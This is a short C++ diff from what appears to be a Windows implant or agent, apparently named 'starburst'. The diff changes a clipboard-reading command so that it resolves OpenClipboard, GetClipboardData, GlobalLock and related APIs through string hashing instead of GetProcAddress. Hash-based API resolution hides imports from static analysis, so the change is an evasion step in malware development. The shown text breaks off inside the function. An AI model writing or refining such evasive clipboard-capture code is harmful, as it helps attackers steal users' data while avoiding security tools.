@@ -38,17 +38,17 @@ auto declfn starburst::cmd_clipboard(
     auto k32 = (HMODULE)inst.kernel32.handle;
 
     auto pOpenClipboard = reinterpret_cast<fn_OpenClipboard>(
-        inst.kernel32.GetProcAddress( h_user32, symbol<LPCSTR>( "OpenClipboard" ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( h_user32 ), expr::hash_string( "OpenClipboard" ) ) );
     auto pCloseClipboard = reinterpret_cast<fn_CloseClipboard>(
-        inst.kernel32.GetProcAddress( h_user32, symbol<LPCSTR>( "CloseClipboard" ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( h_user32 ), expr::hash_string( "CloseClipboard" ) ) );
     auto pGetClipboardData = reinterpret_cast<fn_GetClipboardData>(
-        inst.kernel32.GetProcAddress( h_user32, symbol<LPCSTR>( "GetClipboardData" ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( h_user32 ), expr::hash_string( "GetClipboardData" ) ) );
     auto pIsClipboardFormatAvailable = reinterpret_cast<fn_IsClipboardFormatAvailable>(
-        inst.kernel32.GetProcAddress( h_user32, symbol<LPCSTR>( "IsClipboardFormatAvailable" ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( h_user32 ), expr::hash_string( "IsClipboardFormatAvailable" ) ) );
     auto pGlobalLock = reinterpret_cast<fn_GlobalLock>(
-        inst.kernel32.GetProcAddress( k32, symbol<LPCSTR>( "GlobalLock" ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( k32 ), expr::hash_string( "GlobalLock" ) ) );
     auto pGlobalUnlock = reinterpret_cast<fn_GlobalUnlock>(
-        inst.kernel32.GetProcAddress( k32, symbol<LPCSTR>( "GlobalUnlock" ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( k32 ), expr::hash_string( "GlobalUnlock" ) ) );
 
     if ( !pOpenClipboard || !pCloseClipboard || !pGetClipboardData ||
          !pIsClipboardFormatAvailable || !pGlobalLock || !pGlobalUnlock ) {
